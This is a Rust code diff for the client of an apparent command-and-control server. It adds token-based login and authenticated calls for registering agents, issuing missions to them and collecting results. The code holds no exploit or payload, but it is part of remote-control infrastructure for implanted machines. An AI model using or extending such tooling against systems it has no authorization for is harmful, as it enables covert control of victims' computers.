@@ -17,26 +17,46 @@ pub enum ClientError {
     Crypto(#[from] crypto::CryptoError),
     #[error("UTF-8 error: {0}")]
     Utf8(#[from] std::str::Utf8Error),
+    #[error("Unauthorized")]
+    Unauthorized,
 }
 
 pub type ClientResult<T> = Result<T, ClientError>;
+
+const AUTHORIZATION: &str = "Authorization";
+
+pub fn login(signing_key: &mut crypto::SigningKey) -> ClientResult<String> {
+    let (_, crypto_negociation) = model::CryptoNegociation::new(signing_key);
+    let response = ureq::get(C2_URL).send_json(crypto_negociation)?;
+
+    if response.status() == 200 {
+        println!("Logged in");
+        Ok(response.into_json::<String>()?)
+    } else {
+        eprintln!("Failed to log in");
+        Err(ClientError::Unauthorized)
+    }
+}
 
 pub mod agents {
     use super::*;
 
     pub fn create(
+        token: &str,
         name: String,
         identity: crypto::VerifyingKey,
         platform: model::Platform,
     ) -> ClientResult<()> {
-        let response = ureq::post(&format!("{C2_URL}/agents")).send_json(model::Agent {
-            id: Default::default(),
-            name,
-            identity,
-            platform,
-            created_at: Default::default(),
-            last_seen_at: Default::default(),
-        })?;
+        let response = ureq::post(&format!("{C2_URL}/agents"))
+            .set(AUTHORIZATION, &format!("Bearer {token}"))
+            .send_json(model::Agent {
+                id: Default::default(),
+                name,
+                identity,
+                platform,
+                created_at: Default::default(),
+                last_seen_at: Default::default(),
+            })?;
 
         if response.status() == 201 {
             println!("Agent created");
@@ -46,14 +66,17 @@ pub mod agents {
         Ok(())
     }
 
-    pub fn get() -> ClientResult<Vec<model::Agent>> {
-        let agents: Vec<model::Agent> =
-            ureq::get(&format!("{C2_URL}/agents")).call()?.into_json()?;
+    pub fn get(token: &str) -> ClientResult<Vec<model::Agent>> {
+        let agents: Vec<model::Agent> = ureq::get(&format!("{C2_URL}/agents"))
+            .set(AUTHORIZATION, &format!("Bearer {token}"))
+            .call()?
+            .into_json()?;
         Ok(agents)
     }
 
-    pub fn update(agent: &model::Agent) -> ClientResult<()> {
+    pub fn update(token: &str, agent: &model::Agent) -> ClientResult<()> {
         if ureq::put(&format!("{C2_URL}/agents/{}", agent.id))
+            .set(AUTHORIZATION, &format!("Bearer {token}"))
             .send_json(agent)?
             .status()
             == 200
@@ -65,8 +88,9 @@ pub mod agents {
         Ok(())
     }
 
-    pub fn delete(agent_id: i32) -> ClientResult<()> {
+    pub fn delete(token: &str, agent_id: i32) -> ClientResult<()> {
         if ureq::delete(&format!("{C2_URL}/agents/{agent_id}"))
+            .set(AUTHORIZATION, &format!("Bearer {token}"))
             .call()?
             .status()
             == 200
@@ -82,8 +106,9 @@ pub mod agents {
 pub mod missions {
     use super::*;
 
-    pub fn issue(agent_id: i32, task: model::Task) -> ClientResult<model::Mission> {
+    pub fn issue(token: &str, agent_id: i32, task: model::Task) -> ClientResult<model::Mission> {
         let mission: model::Mission = ureq::post(&format!("{C2_URL}/missions"))
+            .set(AUTHORIZATION, &format!("Bearer {token}"))
             .send_json(serde_json::to_value(&model::Mission {
                 id: Default::default(),
                 agent_id,
@@ -96,8 +121,10 @@ pub mod missions {
         Ok(mission)
     }
 
-    pub fn get_result(mission_id: i32) -> ClientResult<Option<String>> {
-        let response = ureq::get(&format!("{C2_URL}/missions/{mission_id}")).call()?;
+    pub fn get_result(token: &str, mission_id: i32) -> ClientResult<Option<String>> {
+        let response = ureq::get(&format!("{C2_URL}/missions/{mission_id}"))
+            .set(AUTHORIZATION, &format!("Bearer {token}"))
+            .call()?;
         if response.status() == 204 {
             Ok(None)
         } else {
